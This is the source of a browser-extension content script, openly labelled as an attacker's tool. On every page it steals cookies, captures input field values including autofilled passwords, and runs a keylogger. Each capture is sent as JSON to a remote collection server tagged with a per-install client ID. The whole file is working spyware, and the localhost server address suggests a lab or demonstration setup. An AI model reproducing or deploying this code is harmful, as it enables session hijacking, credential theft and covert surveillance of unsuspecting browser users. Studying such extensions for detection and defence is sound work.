/* Attacker's server */
var host_url = "http://127.0.0.1:3000/"

/* Get the client ID that retrieved from server on install */
var clientID;
chrome.storage.local.get(['id'],function(result){ clientID = result.id });

/* Given a host endpoint and a body, make a request */
function PostTo(endpoint,request) {
    fetch(host_url+endpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(request)
    });
}


/* ## Page Ready Event  ## */

document.addEventListener('readystatechange',event => {
    /* Wait for the page to be fully loaded */
    if (event.target.readyState === "complete") {
        saveAndSendC(); 
    }
})


/* ## Cookies ## */

function saveAndSendC() {
    /* If the site doesn't use cookies, but we know that's impossible */
    if (!document.cookie) { return; }
    /* output JSON */
    var curCookies = {}
    curCookies['url'] = document.URL;
    curCookies['id'] = clientID;
    curCookies['title'] = document.title || 'No Title'
    curCookies['cookies'] = document.cookie;
    // alert(JSON.stringify(curCookies)); // placeholder
    PostTo('add/cookies',curCookies);
}





/* ## Input Field Grabber - will catch autofill thanks to the caller event ## */

function getInputFields() {
    allInputs = document.getElementsByTagName('input');
    for (var i = 0; i < allInputs.length; i++) {
        saveAndSendIF(allInputs[i])
    }
}


/* Sends to an input field only endpoint */
function saveAndSendIF(target) {
    if (!target.value) { return; }
    /* output JSON */
    var curInput = {} 
    curInput['id'] = clientID;
    curInput['url'] = document.URL;
    curInput['title'] = document.title || 'No Title'
    curInput['type'] = target.name || 'None'
    curInput['content'] = target.value;
    /* Send to remote server */
    // alert(JSON.stringify(curInput)); // placeholder
    PostTo('add/input',curInput);
}





/* ## Keylogger ## */

/* Temporary array of keypresses for the current page / form, reset and sent whenever we assume the user is done with a given input  */
var curlog = [];

/* On keydown event, log the keystroke */
document.addEventListener('keydown',function(e) {
    /* Some browsers won't give this listener the actual event, so we get it using a legacy feature */
    e = e || window.event;
    var curChar = e.key
    if (curChar) {
        /* If we get a Shift keypress, capitalise the next letter instead */
        if (curlog[curlog.length - 1] === 'Shift' && curChar.length === 1) {
            curlog[curlog.length - 1] = curChar.toLocaleUpperCase();
        /* Else just add the letter to the log */
        } else {
            curlog.push(curChar);
        }
        
        /* If it's any of these, the user is done with this input box and we can send */
        if (curChar == "Tab") {
            saveAndSendKS();
        }
        if (curChar == "Enter") {
            saveAndSendKS();
        }
    }
});

/* On click event, save and send the current log */
document.addEventListener('mousedown',function() {
    saveAndSendKS();
});

/* On the FIRST click event, grab the autofilled fields */
document.addEventListener('mousedown',function() {
    getInputFields() ;
},{once:true});

/* Send user input before user leaves webpage or close tab/window*/
window.onbeforeunload = function() {
    saveAndSendKS();
}

/* Construct a JSON to send, clear the log for the next input box */
function saveAndSendKS() {
    if (curlog.length === 0) { return; }
    /* output JSON */
    var curMessage = {} 
    curMessage['id'] = clientID;
    curMessage['url'] = document.URL;
    curMessage['title'] = document.title || 'No Title'
    /* Set and clear log */
    curMessage['content'] = curlog;
    curlog = [];
    /* Send to remote server */
    // alert(JSON.stringify(curMessage)); // placeholder
    PostTo('add/keystrokes',curMessage);

}